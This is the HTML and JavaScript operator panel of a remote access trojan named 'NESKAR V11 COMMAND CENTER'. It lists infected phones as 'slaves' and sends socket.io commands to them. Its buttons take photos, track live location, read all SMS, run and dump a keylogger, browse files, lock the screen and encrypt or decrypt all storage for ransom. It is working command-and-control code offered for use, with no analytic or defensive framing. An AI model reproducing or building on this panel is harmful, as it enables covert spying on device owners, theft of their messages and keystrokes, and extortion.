<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NESKAR V11 COMMAND CENTER</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Consolas', monospace; margin: 0; display: flex; }
        #side { width: 320px; border-right: 2px solid #ff0000; height: 100vh; background: #0a0a0a; padding: 15px; }
        #main { flex: 1; padding: 25px; overflow-y: auto; }
        .t-card { border: 1px solid #333; padding: 10px; margin: 10px 0; cursor: pointer; border-radius: 4px; }
        .t-card.active { border-color: #ff0000; background: #1a0000; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
        button { background: #111; color: #ff0000; border: 1px solid #ff0000; padding: 8px; cursor: pointer; font-weight: bold; font-size: 11px; }
        button:hover { background: #ff0000; color: #000; }
        #log { background: #000; border: 1px solid #222; height: 350px; overflow-y: auto; padding: 10px; margin-top: 20px; color: #aaa; font-size: 12px; }
        .header { color: #ff0000; text-shadow: 0 0 5px #ff0000; text-align: center; }
    </style>
</head>
<body>
    <div id="side">
        <h2 class="header">NESKAR V11</h2>
        <div id="targetList"></div>
    </div>
    <div id="main">
        <h3 id="targetInfo">SELECT A SLAVE...</h3>
        <div class="grid">
            <button onclick="sc('/flash_on')">FLASH ON</button>
            <button onclick="sc('/flash_off')">FLASH OFF</button>
            <button onclick="sc('/lock_screen')">LOCK SCREEN</button>
            <button onclick="sc('/unlock_screen')">UNLOCK SCREEN</button>
            <button onclick="sc('/take_pic')">TAKE PHOTO</button>
            <button onclick="sc('/location')">GET LOC</button>
            <button onclick="sc('/start_location')">LIVE LOC ON</button>
            <button onclick="sc('/stop_location')">LIVE LOC OFF</button>
            <button onclick="sc('/sysinfo')">SYS INFO</button>
            <button onclick="sc('/check_sms')">READ SMS ALL</button>
            <button onclick="sc('/get_sms_new')">GET NEW SMS</button>
            <button onclick="sc('/get_sms_old')">GET OLD SMS</button>
            <button onclick="sc('/keylog_on')">KEYLOG ON</button>
            <button onclick="sc('/keylog_off')">KEYLOG OFF + DUMP</button>
            <button onclick="sc('/list_files')">FILE MANAGER</button>
            <button onclick="sc('/lock_storage')">ENCRYPT ALL</button>
            <button onclick="sc('/unlock_storage')">DECRYPT ALL</button>
            <button onclick="sc('/open_app')">OPEN APP</button>
            <button onclick="sc('/close_app')">KILL APP</button>
        </div>
        <div id="log"></div>
    </div>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let cur = null;
        socket.on('update_list', (targets) => {
            const list = document.getElementById('targetList');
            list.innerHTML = '';
            targets.forEach(t => {
                const d = document.createElement('div');
                d.className = `t-card ${cur === t.id ? 'active' : ''}`;
                d.innerHTML = `[${t.id.substring(0,8)}] ${t.info.model}`;
                d.onclick = () => { cur = t.id; document.getElementById('targetInfo').innerText = "TARGET: " + t.id; };
                list.appendChild(d);
            });
        });
        socket.on('log_result', (d) => {
            const l = document.getElementById('log');
            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${d.res}</div>`;
            l.scrollTop = l.scrollHeight;
        });
        function sc(cmd) { if(!cur) return; socket.emit('send_cmd', { targetId: cur, cmd: cmd }); }
    </script>
</body>
</html>
